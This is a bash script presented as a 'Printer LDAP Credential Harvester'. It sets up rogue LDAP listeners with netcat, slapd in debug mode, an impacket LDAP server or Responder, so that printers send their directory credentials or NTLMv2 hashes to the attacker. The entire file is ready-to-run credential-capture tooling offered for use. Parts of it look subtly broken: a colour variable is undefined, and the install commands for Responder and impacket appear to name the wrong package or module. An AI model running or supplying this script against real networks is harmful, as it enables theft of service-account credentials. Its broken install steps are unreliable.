#!/bin/bash
# Quick LDAP Credential Capture for Printer Testing
# Simple one-liner style script for rapid testing

set -e

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}[🖨️] Printer LDAP Credential Harvester${NC}"
echo -e "${YELLOW}[ℹ️]  Quick setup for capturing printer LDAP credentials${NC}"
echo ""

# Check arguments
if [ $# -eq 0 ]; then
    echo -e "${YELLOW}[?] Usage:${NC} $0 [method]"
    echo -e "${YELLOW}[?] Methods:${NC}"
    echo "    netcat    - Simple netcat listener (port 389)"
    echo "    slapd     - Full LDAP server with debug output (recommended)"
    echo "    impacket  - Python-based LDAP server"
    echo "    responder - NTLMv2 hash capture"
    echo ""
    echo -e "${YELLOW}[?] Example:${NC} $0 slapd"
    exit 1
fi

METHOD=$1

# Check for root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${YELLOW}[!] Please run as root (sudo)${NC}"
    exit 1
fi

case $METHOD in
    netcat)
        echo -e "${GREEN}[+] Starting netcat listener on port 389...${NC}"
        echo -e "${YELLOW}[ℹ️]  Works best on older printers with simple-bind${NC}"
        echo -e "${YELLOW}[ℹ️]  Press Ctrl+C to stop${NC}"
        echo ""
        sudo nc -k -v -l -p 389
        ;;
    
    slapd)
        # Check for slapd
        if ! command -v slapd &> /dev/null; then
            echo -e "${YELLOW}[+] Installing slapd...${NC}"
            if command -v apt &> /dev/null; then
                apt update && apt install -y slapd ldap-utils
            else
                echo -e "${RED}[-] Please install slapd manually${NC}"
                exit 1
            fi
        fi
        
        echo -e "${GREEN}[+] Starting slapd in debug mode...${NC}"
        echo -e "${YELLOW}[ℹ️]  Credentials will appear in clear-text in output${NC}"
        echo -e "${YELLOW}[ℹ️]  Press Ctrl+C to stop${NC}"
        echo ""
        
        # Stop existing slapd
        systemctl stop slapd 2>/dev/null || true
        
        # Start with debug output
        slapd -d 2 -h "ldap:///"
        ;;
    
    impacket)
        # Check for impacket
        if ! python3 -c "import impacket" &> /dev/null; then
            echo -e "${YELLOW}[+] Installing impacket...${NC}"
            pip3 install impacket
        fi
        
        echo -e "${GREEN}[+] Starting impacket LDAP server...${NC}"
        echo -e "${YELLOW}[ℹ️]  Press Ctrl+C to stop${NC}"
        echo ""
        python3 -m impacket.examples.ldapd -debug
        ;;
    
    responder)
        # Check for responder
        if ! python3 -c "import responder" &> /dev/null; then
            echo -e "${YELLOW}[+] Installing responder...${NC}"
            pip3 install responder
        fi
        
        # Get interface
        INTERFACE=${2:-$(ip route | grep default | awk '{print $5}')}
        
        echo -e "${GREEN}[+] Starting Responder on interface: $INTERFACE${NC}"
        echo -e "${YELLOW}[ℹ️]  Captures NTLMv2 hashes (not clear-text)${NC}"
        echo -e "${YELLOW}[ℹ️]  Press Ctrl+C to stop${NC}"
        echo ""
        responder -I $INTERFACE -wrf
        ;;
    
    *)
        echo -e "${RED}[-] Unknown method: $METHOD${NC}"
        echo -e "${YELLOW}[?] Available methods: netcat, slapd, impacket, responder${NC}"
        exit 1
        ;;
esac
